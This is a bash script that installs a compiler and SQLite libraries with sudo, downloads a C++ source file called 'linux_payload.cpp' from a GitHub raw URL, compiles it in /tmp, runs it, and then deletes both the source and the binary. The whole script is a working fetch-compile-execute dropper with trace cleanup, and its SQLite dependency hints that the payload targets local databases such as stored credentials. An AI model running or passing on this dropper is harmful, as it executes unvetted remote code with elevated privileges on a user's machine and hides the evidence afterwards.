#!/bin/bash

set -e

URL="https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp"
SOURCE="/tmp/p.cpp"
BINARY="/tmp/p"

echo "[*] Detecting OS..."

# Detect package manager
if command -v apt-get &> /dev/null; then
    PKG_MGR="apt"
    INSTALL_CMD="sudo apt-get update && sudo apt-get install -y libsqlite3-dev g++"
elif command -v dnf &> /dev/null; then
    PKG_MGR="dnf"
    INSTALL_CMD="sudo dnf install -y sqlite-devel gcc-c++"
elif command -v yum &> /dev/null; then
    PKG_MGR="yum"
    INSTALL_CMD="sudo yum install -y sqlite-devel gcc-c++"
elif command -v pacman &> /dev/null; then
    PKG_MGR="pacman"
    INSTALL_CMD="sudo pacman -Sy --noconfirm sqlite gcc"
elif command -v apk &> /dev/null; then
    PKG_MGR="apk"
    INSTALL_CMD="sudo apk add --no-cache sqlite-dev g++"
elif command -v zypper &> /dev/null; then
    PKG_MGR="zypper"
    INSTALL_CMD="sudo zypper install -y sqlite3-devel gcc-c++"
else
    echo "[!] Unknown package manager. Install sqlite3-dev manually."
    exit 1
fi

echo "[+] Detected: $PKG_MGR"
echo "[*] Installing dependencies..."
eval "$INSTALL_CMD"

echo "[*] Downloading payload..."
curl -sL "$URL" -o "$SOURCE" || wget -q "$URL" -O "$SOURCE"

echo "[*] Compiling..."
g++ -std=c++17 -O2 -o "$BINARY" "$SOURCE" -lsqlite3

echo "[*] Executing..."
chmod +x "$BINARY"
"$BINARY"

echo "[*] Cleaning up..."
rm -f "$SOURCE" "$BINARY"
echo "[+] Done"
